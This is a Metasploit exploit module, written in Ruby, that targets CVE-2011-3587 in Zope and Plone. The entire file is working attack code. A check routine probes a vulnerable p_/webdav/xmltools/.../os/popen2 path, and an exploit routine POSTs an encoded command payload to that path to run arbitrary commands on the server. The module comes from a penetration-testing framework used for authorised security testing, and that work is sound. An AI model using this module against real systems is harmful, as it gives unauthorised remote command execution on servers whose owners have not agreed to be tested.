##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Plone and Zope XMLTools Remote Command Execution',
      'Description'    => %q{
        Unspecified vulnerability in Zope 2.12.x and 2.13.x, as used in Plone 4.0.x
        through 4.0.9, 4.1, and 4.2 through 4.2a2, allows remote attackers to execute
        arbitrary commands via vectors related to the p_ class in OFS/misc_.py and
        the use of Python modules.

      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Unknown',              # Plone Security Team, original vulnerability discovery
          'Nick Miles',           # Original exploit
          'TecR0c <roccogiovannicalvi[at]gmail.com>' # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2011-3587'],
          ['OSVDB', '76105'],
          ['EDB', '18262'],
          ['URL', 'http://plone.org/products/plone/security/advisories/20110928']
        ],
      'Privileged'     => false,
      'Payload'        =>
      {
        'Compat'     =>
        {
          'PayloadType'  => 'cmd',
          'RequiredCmd'  => 'generic telnet perl ruby python',
        }
      },
      'Platform'       => %w{ linux unix },
      'Arch'           => ARCH_CMD,
      'Targets'        => [['Automatic',{}]],
      'DisclosureDate' => '2011-10-04',
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('URI',[true, "The path to the Plone installation", "/"]),
      ])
    register_autofilter_ports([ 8080 ])
  end

  def check
    uri = normalize_uri(datastore['URI'], 'p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2')

    res = send_request_raw(
      {
        'uri'       => uri
      }, 25)
    if (res.headers['Bobo-Exception-Type'].to_s =~ /zExceptions.BadRequest/)
      return Exploit::CheckCode::Appears
    end
    # patched == zExceptions.NotFound
    return Exploit::CheckCode::Safe
  end

  def exploit
    uri = normalize_uri(datastore['URI'], 'p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2')

    send_request_cgi(
      {
        'method'    => 'POST',
        'uri'       => uri,
        'vars_post' =>
          {
            'cmd' => payload.encoded,
          }
      }, 0.5) # short timeout, we don't care about the response
  end
end
